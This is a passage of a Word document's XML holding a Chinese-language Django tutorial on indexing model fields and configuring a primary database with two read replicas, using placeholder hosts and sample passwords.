      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>文章模型</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EBC3229" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # </w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用db_index=True对title建立索引</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07892E4C" w14:textId="2AF31B67" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>title = models.CharField('</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>标题</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', max_length=200, db_index=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C1CF7C" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法二: 使用Meta选项</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41FAD6C8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Article(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C852CE9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>文章模型</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F722B7" w14:textId="09E82C2B" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>title = models.CharField('</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>标题</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', max_length=200,)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6861DA09" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6837BF4D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        indexes = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1178C918" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            models.Index(fields=['title']),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109F0DA7" w14:textId="73FE9D5F" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DEB8378" w14:textId="677B3C3E" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django主从数据库配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4067F456" w14:textId="7DC30497" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当你刚刚开始建立一个网站时，可能每天只有数十到上百人访问。这时你只有一个数据库，所有APP的数据表也都放一起的，一台普通的服务器能够应付, 也便于维护。但是当访问量上来后，你会发现一台服务器和一个数据库会根本应付不了这个压力。这时你可能希望实现数据库的主从配置，读写分离，把各个数据库放在不同的服务器上，有的专门负责写入，有的专门负责读取，这时你就要学会使用Django同时连接多个数据库，并自定义读写操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1567BF" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>第一步 修改项目的 settings 配置 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047017B6" w14:textId="3D940E8A" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在 settings.py 中配置需要连接的多个数据库名称和登录信息。在下例中我们自定义了3个数据库，1个主数据库(primary), 2个从数据库(replica)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351F002B" w14:textId="6FFFC4D1" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#project/settings.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660FC5BF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DATABASES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C3E6A2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'default': {},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC73703" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'primary': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B80F31B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'NAME': 'primary',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081E0E50" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'ENGINE': 'django.db.backends.mysql',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E427827" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'HOST': 'xxxx',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A4DC14" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'PORT': 'xxxx',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7903323E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'USER': 'mysql_user',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7047C2B1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'PASSWORD': 'spam',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35395A79" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54EEEAE0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'replica1': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B30BA5B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'NAME': 'replica1',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68187E43" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'ENGINE': 'django.db.backends.mysql',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEA056E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        'HOST': 'xxxx',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F1EE64" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'PORT': 'xxxx',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8A42BA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'USER': 'mysql_user',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1278F6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'PASSWORD': 'eggs',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E75DA58" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA3543E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'replica2': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293D43C5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'NAME': 'replica2',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57ECF656" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'ENGINE': 'django.db.backends.mysql',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8C9EFC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'HOST': 'xxxx',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17C368A7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'PORT': 'xxxx',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C4E702" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'USER': 'mysql_user',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501A39C0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        'PASSWORD': 'bacon',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7150D674" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    },</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C294D93" w14:textId="1926672D" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6791D452" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们还需要在</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> settings.py 添加我们手动编写的数据库路由Router。路由的作用是为数据库的读写制定规则。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608B3869" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DATABASE_ROUTERS = ['Project.database_router.PrimaryReplicaRouter']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13142ECC" w14:textId="6135C95F" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意: 主从数据库的同步是通过MySQL配置实现的，而不是Django实现的。Django只负责多个数据库的访问，不负责各个数据库的同步工作。如果你定义了多个路由，请一定注意路由的执行顺序。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183DE2CC" w14:textId="604564B8" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
